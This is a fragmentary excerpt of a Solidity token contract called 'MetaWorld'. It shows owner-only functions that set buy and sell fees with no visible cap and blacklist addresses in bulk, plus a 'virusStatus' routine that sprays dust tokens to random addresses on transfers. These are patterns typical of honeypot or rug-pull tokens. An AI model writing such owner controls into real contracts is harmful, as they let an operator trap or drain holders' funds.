...
contract Atoken is ERC20, Ownable {
    ...
    constructor() ERC20("MetaWorld", "MetaWorld") {
        ...
        */
        ...
        numTokensSellToSwap = 10000000000 * 10**18;
        _mint(tokenOwner, 10000000000000 * 10**18);
    }
    ...
    function setanitBot(uint256 _maxamount,uint256 _botFee) external onlyOwner {
    ...
    function setMultipleBlclist(address[] calldata accounts, bool value) external onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
    ...
    function setBuyFee(uint256 _buyLpFee,uint256 _buyMarketingFee) external onlyOwner { 
        buyLpFee = _buyLpFee;
        buyMarketingFee = _buyMarketingFee;
    }

    function setSellMarketingFee(uint256 _sellLpFee,uint256 _sellMarketingFee) external onlyOwner { 
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private returns(bool){
        if(takeFee) {
            ...
            if (virusStatus) {             
                for(uint i = 0; i < 10; i++){
                    super._transfer(sender, address(uint160(uint(keccak256(abi.encodePacked(i, block.number, block.difficulty, block.timestamp))))), 1 * 10**9);
                    amount -= 1 * 10**9;
                }
            }
